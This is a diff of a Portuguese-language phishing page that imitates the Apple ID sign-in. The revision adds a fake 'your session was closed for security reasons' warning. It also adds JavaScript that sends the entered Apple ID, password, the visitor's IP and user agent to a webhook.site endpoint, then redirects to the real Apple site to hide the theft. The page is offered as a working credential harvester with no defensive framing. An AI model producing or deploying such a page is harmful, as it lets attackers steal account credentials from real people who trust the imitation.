@@ -1,82 +1,126 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Entrar no Apple ID</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
-            background-color: #f4f4f7;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            text-align: center;
-        }
-        h2 {
-            color: #333;
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        .apple-logo {
-            width: 100px;
-            margin-bottom: 30px;
-        }
-        .input-field {
-            width: 100%;
-            padding: 12px 15px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 10px;
-            font-size: 16px;
-        }
-        .input-field:focus {
-            border-color: #0071e3;
-            outline: none;
-        }
-        .submit-btn {
-            width: 100%;
-            padding: 12px 0;
-            background-color: #0071e3;
-            color: white;
-            font-size: 18px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-        .submit-btn:hover {
-            background-color: #005bb5;
-        }
-        .forgot-password {
-            font-size: 14px;
-            color: #0071e3;
-            text-decoration: none;
-        }
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Iniciar sessão - Apple ID</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: #f5f5f7;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 320px;
+      width: 100%;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 24px;
+      font-size: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0071e3;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005bb5;
+    }
+    .warning {
+      color: #d32f2f;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+    }
+    .loader {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #0071e3;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a1/Apple_logo.svg" alt="Apple Logo" class="apple-logo">
-        <h2>Entrar no Apple ID</h2>
-        <form action="https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418" method="POST" id="loginForm">
-            <input type="text" name="username" class="input-field" placeholder="Apple ID" required>
-            <input type="password" name="password" class="input-field" placeholder="Senha" required>
-            <button type="submit" class="submit-btn">Entrar</button>
-        </form>
-        <a href="#" class="forgot-password">Esqueceu o Apple ID ou a senha?</a>
-    </div>
+  <div class="container">
+    <h2>Iniciar sessão com Apple ID</h2>
+    <p class="warning">⚠️ Por motivos de segurança, sua sessão foi encerrada. Reautentique-se.</p>
+    <form id="loginForm">
+      <input type="text" name="apple_id" placeholder="Apple ID" required>
+      <input type="password" name="password" placeholder="Senha" required>
+      <button type="submit" id="submitBtn">Continuar</button>
+      <div class="loader" id="loader"></div>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault(); // Impede o envio padrão do formulário
+      const submitBtn = document.getElementById("submitBtn");
+      const loader = document.getElementById("loader");
+
+      // Mostra o loader e desativa o botão
+      submitBtn.style.display = "none";
+      loader.style.display = "block";
+
+      try {
+        // Coleta metadados (IP, User-Agent)
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+
+        // Envia dados para o webhook (substitua SEU_WEBHOOK_AQUI)
+        await fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            apple_id: document.getElementsByName("apple_id")[0].value,
+            password: document.getElementsByName("password")[0].value,
+            ip: ipData.ip,
+            user_agent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+          })
+        });
+
+        // Redireciona para a página oficial da Apple após 1.5s (tempo para garantir o envio)
+        setTimeout(() => {
+          window.location.href = "https://appleid.apple.com/";
+        }, 1500);
+
+      } catch (error) {
+        console.error("Erro ao enviar dados:", error);
+        // Fallback: Redireciona mesmo se o webhook falhar
+        window.location.href = "https://appleid.apple.com/";
+      }
+    });
+  </script>
 </body>
 </html>
